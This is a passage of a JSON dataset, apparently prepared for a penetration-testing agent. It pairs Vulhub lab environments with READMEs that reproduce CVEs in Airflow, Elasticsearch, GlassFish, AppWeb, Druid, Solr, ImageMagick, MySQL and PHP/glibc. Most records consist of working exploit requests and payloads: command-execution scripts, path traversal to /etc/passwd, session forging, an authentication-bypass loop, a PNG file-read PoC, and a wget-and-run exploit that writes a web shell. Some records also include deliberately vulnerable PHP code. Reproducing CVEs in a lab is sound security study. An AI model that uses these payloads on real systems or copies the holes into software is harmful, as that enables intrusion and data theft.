AIRFLOW__CORE__DAGS_ARE_PAUSED_AT_CREATION: 'true'\n    AIRFLOW__CORE__LOAD_EXAMPLES: 'true'\n    AIRFLOW__WEBSERVER__AUTHENTICATE: 'true'\n    AIRFLOW__WEBSERVER__AUTH_BACKEND: 'airflow.contrib.auth.backends.password_auth'\n  user: \"${AIRFLOW_UID:-50000}:${AIRFLOW_GID:-50000}\"\n  depends_on:\n    redis:\n      condition: service_healthy\n    postgres:\n      condition: service_healthy\n\nservices:\n  postgres:\n    image: postgres:13-alpine\n    environment:\n      POSTGRES_USER: airflow\n      POSTGRES_PASSWORD: airflow\n      POSTGRES_DB: airflow\n    healthcheck:\n      test: [\"CMD\", \"pg_isready\", \"-U\", \"airflow\"]\n      interval: 5s\n      retries: 5\n\n  redis:\n    image: redis:5-alpine\n    healthcheck:\n      test: [\"CMD\", \"redis-cli\", \"ping\"]\n      interval: 5s\n      timeout: 30s\n      retries: 50\n\n  airflow-webserver:\n    <<: *airflow-common\n    command: webserver\n    ports:\n      - 8080:8080\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"--fail\", \"http://localhost:8080/health\"]\n      interval: 10s\n      timeout: 10s\n      retries: 5\n\n  airflow-scheduler:\n    <<: *airflow-common\n    command: scheduler\n    healthcheck:\n      test: [\"CMD-SHELL\", 'airflow jobs check --job-type SchedulerJob --hostname \"$${HOSTNAME}\"']\n      interval: 10s\n      timeout: 10s\n      retries: 5\n\n  airflow-worker:\n    <<: *airflow-common\n    command: worker\n    healthcheck:\n      test:\n        - \"CMD-SHELL\"\n        - 'celery --app airflow.executors.celery_executor.app inspect ping -d \"celery@$${HOSTNAME}\"'\n      interval: 10s\n      timeout: 10s\n      retries: 5\n\n  airflow-init:\n    <<: *airflow-common\n    entrypoint: python /opt/airflow/init-user.py\n    volumes:\n      - ./init-user.py:/opt/airflow/init-user.py\n    environment:\n      <<: *airflow-common-env\n      _AIRFLOW_DB_UPGRADE: 'true'\n\n  flower:\n    <<: *airflow-common\n    command: flower\n    ports:\n      - 5555:5555\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"--fail\", \"http://localhost:5555/\"]\n      interval: 10s\n      timeout: 10s\n      retries: 5\n\n```\n\n",
    "readme": "# Apache Airflow Authentication Bypass (CVE-2020-17526)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Airflow is an open source, distributed task scheduling framework. Although authentication is not required by default, but the administration can specify the `webserver.authenticate=True` to enable it.\n\nIn the version prior to 1.10.13, Apache Airflow uses a default session secert key, which leads to impersonate arbitrary user when authentication is enabled.\n\nReferences:\n\n- <https://lists.apache.org/thread/rxn1y1f9fco3w983vk80ps6l32rzm6t0>\n- <https://kloudle.com/academy/authentication-bypass-in-apache-airflow-cve-2020-17526-and-aws-cloud-platform-compromise>\n\n## Vulnerability Environment\n\nExecute the following commands to start an airflow 1.10.10 server:\n\n```bash\n#Initialize the database\ndocker compose run airflow-init\n\n#Start service\ndocker compose up -d\n```\n\nAfter the server is started, browse the `http://your-ip:8080` to see the login page of Apache Airflow. Yes, this server required authentication.\n\n## Exploit\n\nFirstly, browse the login page and get a session string from Cookie:\n\n```\ncurl -v http://localhost:8080/admin/airflow/login\n```\n\n![](1.png)\n\nThen, use [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) to crack the session key:\n\n```\nflask-unsign -u -c [session from Cookie]\n```\n\n![](2.png)\n\nBingo, we got the valid session key `temporary_key`. Then, use this key to generate a new session whose `user_id` equals to `1`:\n\n```\nflask-unsign -s --secret temporary_key -c \"{'user_id': '1', '_fresh': False, '_permanent': True}\"\n```\n\n![](3.png)\n\nFinally, use this generated session to log in successfully:\n\n![](4.png)\n"
  },
  {
    "filename": "CVE-2014-3120.md",
    "filenamenomd": "CVE-2014-3120",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2014-3120/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/elasticsearch/CVE-2014-3120/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 97 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n es:\n   image: vulhub/elasticsearch:1.1.1\n   ports:\n    - \"9200:9200\"\n    - \"9300:9300\"\n```\n\n",
    "readme": "# ElasticSearch Remote Code Execution (CVE-2014-3120)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nElasticSearch is a distributed, RESTful search and analytics engine.\n\nThe default configuration in Elasticsearch before 1.2 enables dynamic scripting, which allows remote attackers to execute arbitrary MVEL expressions and Java code via the source parameter to `_search`.\n\nHere's an example of MVEL code that executes system commands:\n\n```java\nimport java.io.*;\nnew java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();\n```\n\nReferences:\n\n- <https://bou.ke/blog/elasticsearch-rce/>\n- <https://www.exploit-db.com/exploits/33370>\n\n## Vulnerability Reproduction\n\nExecute the following commands to start a vulnerable ElasticSearch server 1.1.1:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, you can access the ElasticSearch API at `http://your-ip:9200`.\n\n## Exploitation\n\nThe exploit requires at least one document in the index. First, create a document:\n\n```\nPOST /website/blog/ HTTP/1.1\nHost: your-ip:9200\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 25\n\n{\n  \"name\": \"vulhub\"\n}\n```\n\nThen, send a request containing the malicious MVEL script to execute arbitrary commands:\n\n```\nPOST /_search?pretty HTTP/1.1\nHost: your-ip:9200\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 343\n\n{\n    \"size\": 1,\n    \"query\": {\n      \"filtered\": {\n        \"query\": {\n          \"match_all\": {\n          }\n        }\n      }\n    },\n    \"script_fields\": {\n        \"command\": {\n            \"script\": \"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\"id\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next();\"\n        }\n    }\n}\n```\n\nThe command execution result will be returned in the response:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2017-1000028.md",
    "filenamenomd": "CVE-2017-1000028",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/glassfish/CVE-2017-1000028/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/glassfish/CVE-2017-1000028/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 190 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n glassfish:\n   image: vulhub/glassfish:4.1\n   ports:\n    - \"4848:4848\"\n    - \"5005:5005\"\n   environment:\n    - ADMIN_PASSWORD=vulhub_default_password\n    - JAVA_DEBUGGER_PORT=5005\n\n```\n\n",
    "readme": "# GlassFish 4.1.0 Arbitrary File Read (CVE-2017-1000028)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGlassFish is an open-source application server for the Java EE platform. A vulnerability in GlassFish allows attackers to read arbitrary files through UTF-8 Overlong Encoding attack.\n\nThe vulnerability exists because GlassFish does not properly handle UTF-8 Overlong Encoding when decoding URLs. As a result, `%c0%ae` is decoded as the ASCII character `.` (dot). By using `%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/` in the URL, an attacker can traverse directories and read arbitrary files on the system.\n\nReferences:\n\n- <https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904>\n- <https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html>\n\n## Environment Setup\n\nExecute the following command to start a GlassFish server 4.1:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, you can access GlassFish Admin Console on `http://your-ip:4848`.\n\n## Vulnerability Reproduction\n\nVisit the following URL to read the contents of `/etc/passwd`:\n\n```\nhttps://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd\n```\n\n![](1.png)\n\n### Additional Notes\n\nThe super administrator password is set in `docker-compose.yml`, with a default value of `vulhub_default_password`. You can use this password to log in to the admin account on port 4848.\n"
  },
  {
    "filename": "CVE-2018-8715.md",
    "filenamenomd": "CVE-2018-8715",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/appweb/CVE-2018-8715/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/appweb/CVE-2018-8715/appweb.conf\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/appweb/CVE-2018-8715/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 142 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/appweb:7.0.1\n   volumes:\n    - ./appweb.conf:/etc/appweb/appweb.conf\n   ports:\n    - \"8080:8080\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/appweb/CVE-2018-8715/appweb.conf\n\n- Extension: .conf\n- Language: ini\n- Size: 172 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```ini\nListen       0.0.0.0:8080\nDocuments \"/var/www/appweb\"\n\nAddHandler fileHandler\n\nAuthStore config\nUser admin 2fd6e47ff9bb70c0465fd2f5c8e5305e user\nAuthType digest example.com\n```\n\n",
    "readme": "# AppWeb Authentication Bypass vulnerability (CVE-2018-8715)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nAppWeb is an embedded Web Server based on an open source GPL agreement that was developed and maintained by Embedthis Software LLC. It is written in C/C++ and can run on almost any modern operating system. Of course, it aims to provide a Web Application container for embedded devices.\n\nAppWeb can be configured for authentication, which includes the following three authentication methods:\n\n- `basic`, traditional HTTP basic authentication\n- `digest`, improved HTTP basic authentication. At this mode, the Cookie will be used to authentication instead of `Authorization` header.\n- `form`, HTML based form authentication\n\nIn the Appweb versions before 7.0.3, have a logic flaw related to the authCondition function in `http/httpLib.c`. With a forged HTTP request, it is possible to bypass authentication for the `form` and `digest` login types.\n\nReference link:\n\n- https://ssd-disclosure.com/index.php/archives/3676\n\n## Vulnerability environment\n\nLaunch an Appweb 7.0.1 server with `digest` authentication by executing the following command:\n\n```\ndocker compose up -d\n```\n\nTo access `http://your-ip:8080`, you need to enter your account password.\n\n## Exploit\n\nThe current username is `admin`, so you can use following request to bypass the authentication:\n\n```\nGET / HTTP/1.1\nHost: example.com\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nAuthorization: Digest username=admin\n\n\n```\n\nAs you can see, since we did not pass in the password field, the server error occurred with a `200 status code` and the session setting header:\n\n![](1.png)\n\nThe page can be accessed normally with this session header:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2021-25646.md",
    "filenamenomd": "CVE-2021-25646",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/apache-druid/CVE-2021-25646/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/apache-druid/CVE-2021-25646/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 94 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/apache-druid:0.20.0\n   ports:\n    - \"8888:8888\"\n\n```\n\n",
    "readme": "# Apache Druid Embedded Javascript Remote Code Execution (CVE-2021-25646)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Druid is an open source, distributed data store that is designed for ingesting high volumes of data to provide instant data visibility, ad-hoc analytics and queries with low latency and high concurrency.\n\nApache Druid includes the ability to execute user-provided JavaScript code embedded in various types of requests. This functionality is intended for use in high-trust environments, and is disabled by default. However, in Druid 0.20.0 and earlier, it is possible for an authenticated user to send a specially-crafted request that forces Druid to run user-provided JavaScript code for that request, regardless of server configuration. This can be leveraged to execute code on the target machine with the privileges of the Druid server process.\n\nReferences:\n\n- <https://blogs.juniper.net/en-us/threat-research/cve-2021-25646-apache-druid-embedded-javascript-remote-code-execution>\n- <https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw>\n\n## Vulnerable Environment\n\nExecute following command to start an Apache Druid server 0.20.0:\n\n```\ndocker compose up -d\n```\n\nAfter server is started, you can see the home page of Apache Druid on `http://your-ip:8888`.\n\n## Exploit\n\nSend this request to the server:\n\n```\nPOST /druid/indexer/v1/sampler HTTP/1.1\nHost: your-ip:8888\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json\n\n{\n    \"type\":\"index\",\n    \"spec\":{\n        \"ioConfig\":{\n            \"type\":\"index\",\n            \"firehose\":{\n                \"type\":\"local\",\n                \"baseDir\":\"/etc\",\n                \"filter\":\"passwd\"\n            }\n        },\n        \"dataSchema\":{\n            \"dataSource\":\"test\",\n            \"parser\":{\n                \"parseSpec\":{\n                \"format\":\"javascript\",\n                \"timestampSpec\":{\n\n                },\n                \"dimensionsSpec\":{\n\n                },\n                \"function\":\"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\\\"sh\\\",\\\"-c\\\",\\\"id\\\"]).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:123123,test: a}}\",\n                \"\":{\n                    \"enabled\":\"true\"\n                }\n                }\n            }\n        }\n    },\n    \"samplerConfig\":{\n        \"numRows\":10\n    }\n}\n```\n\nYou will see the output of the `id` command:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2019-17558.md",
    "filenamenomd": "CVE-2019-17558",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/solr/CVE-2019-17558/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/solr/CVE-2019-17558/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 91 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n solr:\n   image: vulhub/solr:8.2.0\n   ports:\n    - \"8983:8983\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# Apache Solr Remote Code Execution Via Velocity Template (CVE-2019-17558)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nSolr is the popular, blazing-fast, open source enterprise search platform built on Apache Lucene(TM).\n\nApache Solr 5.0.0 to Apache Solr 8.3.1 are vulnerable to a Remote Code Execution through the VelocityResponseWriter. A Velocity template can be provided through Velocity templates in a configset `velocity/` directory or as a parameter. A user defined configset could contain renderable, potentially malicious, templates. Parameter provided templates are disabled by default, but can be enabled by setting `params.resource.loader.enabled` by defining a response writer with that setting set to `true`. Defining a response writer requires configuration API access. Solr 8.4 removed the params resource loader entirely, and only enables the configset-provided template rendering when the configset is `trusted` (has been uploaded by an authenticated user).\n\nReferences:\n\n- <https://nvd.nist.gov/vuln/detail/CVE-2019-17558>\n- <https://issues.apache.org/jira/browse/SOLR-13971>\n- <https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133>\n- <https://github.com/jas502n/solr_rce>\n\n## Environment Setup\n\nExecute the following command to start an Apache Solr 8.2.0 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, you can access the Apache Solr management interface at `http://your-ip:8983/`. No authentication is required.\n\n## Vulnerability Reproduction\n\nFirst, get all core names through the following API:\n\n```\nhttp://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json\n```\n\nThe `demo` is the only core in this environment:\n\n![](1.png)\n\nEnable the `params.resource.loader.enabled` configuration through the following API (the endpoint is `/solr/[core name]/config`):\n\n```\nPOST /solr/demo/config HTTP/1.1\nHost: solr:8983\nContent-Type: application/json\nContent-Length: 259\n\n{\n  \"update-queryresponsewriter\": {\n    \"startup\": \"lazy\",\n    \"name\": \"velocity\",\n    \"class\": \"solr.VelocityResponseWriter\",\n    \"template.base.dir\": \"\",\n    \"solr.resource.loader.enabled\": \"true\",\n    \"params.resource.loader.enabled\": \"true\"\n  }\n}\n```\n\nThen, trigger the vulnerability by sending a malicious Velocity template:\n\n```\nhttp://your-ip:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\n```\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2022-44268.md",
    "filenamenomd": "CVE-2022-44268",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2022-44268/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2022-44268/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2022-44268/index.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2022-44268/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 2533 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n#!/usr/bin/env python3\nimport sys\nimport png\nimport zlib\nimport argparse\nimport binascii\nimport logging\n\nlogging.basicConfig(stream=sys.stderr, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\nd = zlib.decompressobj()\ne = zlib.compressobj()\nIHDR = b'\\x00\\x00\\x00\\n\\x00\\x00\\x00\\n\\x08\\x02\\x00\\x00\\x00'\nIDAT = b'x\\x9c\\xbd\\xcc\\xa1\\x11\\xc0 \\x0cF\\xe1\\xb4\\x03D\\x91\\x8b`\\xffm\\x98\\x010\\x89\\x01\\xc5\\x00\\xfc\\xb8\\n\\x8eV\\xf6\\xd9' \\\n       b'\\xef\\xee])%z\\xef\\xfe\\xb0\\x9f\\xb8\\xf7^J!\\xa2Zkkm\\xe7\\x10\\x02\\x80\\x9c\\xf3\\x9cSD\\x0esU\\x1dc\\xa8\\xeaa\\x0e\\xc0' \\\n       b'\\xccb\\x8cf\\x06`gwgf\\x11afw\\x7fx\\x01^K+F'\n\n\ndef parse_data(data: bytes) -> str:\n    _, data = data.strip().split(b'\\n', 1)\n    return binascii.unhexlify(data.replace(b'\\n', b'')).decode()\n\n\ndef read(filename: str):\n    if not filename:\n        logging.error('you must specify a input filename')\n        return\n\n    res = ''\n    p = png.Reader(filename=filename)\n    for k, v in p.chunks():\n        logging.info(\"chunk %s found, value = %r\", k.decode(), v)\n        if k == b'zTXt':\n            name, data = v.split(b'\\x00', 1)\n            res = parse_data(d.decompress(data[1:]))\n\n    if res:\n        sys.stdout.write(res)\n        sys.stdout.flush()\n\n\ndef write(from_filename, to_filename, read_filename):\n    if not to_filename:\n        logging.error('you must specify a output filename')\n        return\n\n    with open(to_filename, 'wb') as f:\n        f.write(png.signature)\n        if from_filename:\n            p = png.Reader(filename=from_filename)\n            for k, v in p.chunks():\n                if k != b'IEND':\n                    png.write_chunk(f, k, v)\n        else:\n            png.write_chunk(f, b'IHDR', IHDR)\n            png.write_chunk(f, b'IDAT', IDAT)\n\n        png.write_chunk(f, b\"tEXt\", b\"profile\\x00\" + read_filename.encode())\n        png.write_chunk(f, b'IEND', b'')\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='POC for CVE-2022-44268')\n    parser.add_argument('action', type=str, choices=('generate', 'parse'))\n    parser.add_argument('-i', '--input', type=str, help='input filename')\n    parser.add_argument('-o', '--output', type=str, help='output filename')\n    parser.add_argument('-r', '--read', type=str, help='target file to read', default='/etc/passwd')\n    args = parser.parse_args()\n    if args.action == 'generate':\n        write(args.input, args.output, args.read)\n    elif args.action == 'parse':\n        read(args.input)\n    else:\n        logging.error(\"bad action\")\n\n\nif __name__ == '__main__':\n    main()\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2022-44268/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 202 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/imagemagick:7.1.0-49-php\n   command: php -t /var/www/html -S 0.0.0.0:8080\n   volumes:\n    - ./index.php:/var/www/html/index.php\n   ports:\n    - \"8080:8080\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2022-44268/index.php\n\n- Extension: .php\n- Language: php\n- Size: 679 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\n$newname = '';\nif (!empty($_FILES)) {\n    $ext = pathinfo($_FILES['file_upload']['name'], PATHINFO_EXTENSION);\n    if (!in_array($ext, ['gif', 'png', 'jpg', 'jpeg'])) {\n        die('Unsupported filetype uploaded.');\n    }\n\n    $newname = uniqid() . '.png';\n    shell_exec(\"convert -resize 50x50 {$_FILES['file_upload']['tmp_name']} ./{$newname}\");\n}\n?>\n<form method=\"post\" enctype=\"multipart/form-data\">\n    File: <input type=\"file\" name=\"file_upload\">\n    <input type=\"submit\">\n</form>\n<br>\n<?php\nif ($newname):\n?>\n<h1>Your image:</h1>\n<p>\n    <a href=\"./<?=$newname?>\" target=\"_blank\">\n        <img src=\"./<?=$newname?>\" width=\"50\" height=\"50\">\n    </a>\n</p>\n<?php\nendif;\n```\n\n",
    "readme": "# ImageMagick Arbitrary File Disclosure (CVE-2022-44268)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nImageMagick is a free and open-source cross-platform software suite for displaying, creating, converting, modifying, and editing raster images.\n\nIn the version prior to 7.1.0-51 on ImageMagick, there is a information disclosure vulnerability that is able to be used to read arbitrary file when modifing a PNG file.\n\nReferences:\n\n- <https://www.metabaseq.com/imagemagick-zero-days/>\n- <https://github.com/ImageMagick/Website/blob/main/ChangeLog.md#710-52---2022-11-06>\n\n## Vulnerable Environment\n\nExecute folloiwing command to start a Web server that uses the ImageMagick to convert an old image to a 50x50 size new image:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, visit `http://your-ip:8080` you will see an upload file button:\n\n![](1.png)\n\nThe [backend service](index.php) is as simple as the following lines of code:\n\n```php\n$newname = uniqid() . '.png';\nshell_exec(\"convert -resize 50x50 {$_FILES['file_upload']['tmp_name']} ./{$newname}\");\n```\n\n## Exploit\n\nTo exploit this issue, you have to prepare a craft PNG file that contains a chunk data with the file path that you want to disclose.\n\nUse [poc.py](poc.py) to generate it:\n\n```\n./poc.py generate -o poc.png -r /etc/passwd\n```\n\n> Install [PyPNG](https://pypng.readthedocs.io/en/latest/) to execute poc.py properly: `pip install pypng`\n\nThere is a type of `tEXt` chunk that contains our payload `profile=/etc/passwd` if you use [010editor](https://en.wikipedia.org/wiki/010_Editor) to review this file:\n\n![](2.png)\n\nThen, upload this file to target server:\n\n![](3.png)\n\nDownload the output artifact as out.png, use poc.py to extract all the chunks from it:\n\n```\n./poc.py parse -i out.png\n```\n\n![](4.png)\n\nAs you can see, `/etc/passwd` is read and the result have been written to output file by ImageMagick.\n"
  },
  {
    "filename": "CVE-2012-2122.md",
    "filenamenomd": "CVE-2012-2122",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/mysql/CVE-2012-2122/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/mysql/CVE-2012-2122/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 88 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n mysql:\n   image: vulhub/mysql:5.5.23\n   ports:\n    - \"3306:3306\"\n```\n\n",
    "readme": "# MySQL Authentication Bypass (CVE-2012-2122)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nWhen connecting to MariaDB/MySQL, the input password is compared with the expected correct password. Due to improper handling, even if memcmp() returns a non-zero value, MySQL may still consider the two passwords to be identical. This means that with just a username, repeated login attempts can lead to successful database access.\n\nAffected versions:\n\n- MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.\n- MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.\n\nReference links:\n\n- http://www.freebuf.com/vuls/3815.html\n- https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/\n\n## Environment Setup\n\nThrough testing, although this environment runs in a container, the ability to reproduce the vulnerability still has some dependency on the host machine. The host machine is best run on Ubuntu or Mac systems, but success is not guaranteed. You are welcome to submit more test results in Issues.\n\nExecute the following command to start the test environment:\n\n```\ndocker compose up -d\n```\n\nAfter the environment starts, a MySQL service (version: 5.5.23) will be launched, listening on port 3306. You can log in directly through a normal MySQL client, the correct root password is 123456.\n\n## Vulnerability Reproduce\n\nWithout knowing the correct password for our environment, run the following command in bash, and after a certain number of attempts, you should be able to successfully log in:\n\n```bash\nfor i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done\n```\n\n![](1.png)\n\nFor more testing and exploitation methods, see the reference links.\n"
  },
  {
    "filename": "CVE-2024-2961.md",
    "filenamenomd": "CVE-2024-2961",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2024-2961/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2024-2961/index.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2024-2961/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 144 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/php:8.3.4-apache\n   volumes:\n    - ./index.php:/var/www/html/index.php\n   ports:\n     - \"8080:80\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2024-2961/index.php\n\n- Extension: .php\n- Language: php\n- Size: 82 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php    \n$data = file_get_contents($_POST['file']);\necho \"File contents: $data\";\n\n```\n\n",
    "readme": "# PHP File Read to Remote Code Execution Through GNU C Library Iconv (CVE-2024-2961)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nThe GNU C Library is designed to be a backwards compatible, portable, and high performance ISO C library.\n\nThe `iconv()` function in the GNU C Library versions 2.39 and older may overflow the output buffer passed to it by up to 4 bytes when converting strings to the ISO-2022-CN-EXT character set, which may be used to crash an application or overwrite a neighbouring variable.\n\nIf an arbitrary file read vulnerability in PHP application, you can upgrade it to remote code execution through the `iconv()` issue CVE-2024-2961.\n\nReferences:\n\n- <https://www.ambionics.io/blog/iconv-cve-2024-2961-p1>\n\n## Vulnerable environment\n\nExecute following command to start a PHP 8.3.4 server with iconv 2.36:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can read the `/etc/passwd` through `http://your-ip:8080/index.php?file=/etc/passwd`.\n\n## Exploit\n\nBefore using the [exploit](https://github.com/ambionics/cnext-exploits), you have to prepare a Linux based system and the Python 3.10+.\n\nInstall the dependencies:\n\n```\npip install pwntools\npip install https://github.com/cfreal/ten/archive/refs/heads/main.zip\n```\n\nThen download and run the POC from <https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py>:\n\n```\nwget https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py\npython cnext-exploit.py http://your-ip:8080/index.php \"echo '<?=phpinfo();?>' > shell.php\"\n```\n\n![](1.png)\n\nAs you can see, `shell.php` has been written successfully:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2017-7504.md",
    "filenamenomd": "CVE-2017-7504",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/jboss/CVE-2017-7504/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jboss/CVE-2017-7504/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 82 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  jboss:\n    image: vulhub/jboss:as-4.0.5\n    ports:\n      - \"8080:8080\"\n```\n\n",
